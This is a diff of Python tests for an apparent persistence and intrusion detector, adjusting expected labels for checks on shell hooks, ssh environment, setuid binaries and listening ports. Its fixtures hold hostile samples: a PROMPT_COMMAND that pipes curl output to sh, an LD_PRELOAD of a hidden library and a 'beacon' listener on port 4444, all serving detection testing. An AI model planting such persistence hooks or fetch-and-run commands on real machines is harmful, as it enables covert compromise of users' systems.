@@ -108,7 +108,7 @@ def test_prompt_command_hook_is_reported(tmp_path):
     home.mkdir()
     _write(home / ".bashrc", "PROMPT_COMMAND='curl -s x | sh'\n")
     findings = check_persistence(home)
-    assert any("prompt_command" in f.what.lower() for f in findings)
+    assert any("prompt-command" in f.what.lower() for f in findings)
 
 
 def test_alias_sudo_is_reported(tmp_path):
@@ -131,8 +131,8 @@ def test_ssh_environment_is_reported(tmp_path):
     home = tmp_path / "home"
     home.mkdir()
     _write(_ssh_dir(home) / "environment", "LD_PRELOAD=/tmp/.x.so\n")
-    findings = check_persistence(home)
-    assert any("ld_preload" in f.what.lower() for f in findings)
+    findings = check_ssh(home)
+    assert any("ld-preload" in f.what.lower() for f in findings)
 
 
 # --- ~/.local/bin / ~/bin ------------------------------------------------
@@ -144,7 +144,7 @@ def test_new_suid_binary_in_local_bin(tmp_path):
     exe.write_text("#!/bin/sh\n")
     exe.chmod(0o4755)
     findings = check_user_binaries(home, baseline_names=set())
-    assert any(f.severity == "alert" and "suid" in f.what.lower()
+    assert any(f.severity == "alert" and "setuid" in f.what.lower()
                for f in findings)
 
 
@@ -226,7 +226,8 @@ def test_unusual_hour_login_is_a_warning():
 
 def test_ss_listener_and_odd_port():
     text = ("LISTEN 0 128 0.0.0.0:4444 users:((\"beacon\",pid=9,fd=3))\n"
+            "LISTEN 0 128 0.0.0.0:8080 users:((\"app\",pid=7,fd=3))\n"
             "ESTAB 0 0 10.0.0.9:443 9.9.9.9:443 users:((\"ok\",pid=8,fd=4))\n")
     findings = parse_ss_output(text, baseline_hosts=set())
     assert any(f.severity == "alert" and "4444" in f.what for f in findings)
-    assert any(f.severity == "warn" and "LISTEN" in f.what.upper() for f in findings)
+    assert any(f.severity == "warn" and "8080" in f.what for f in findings)
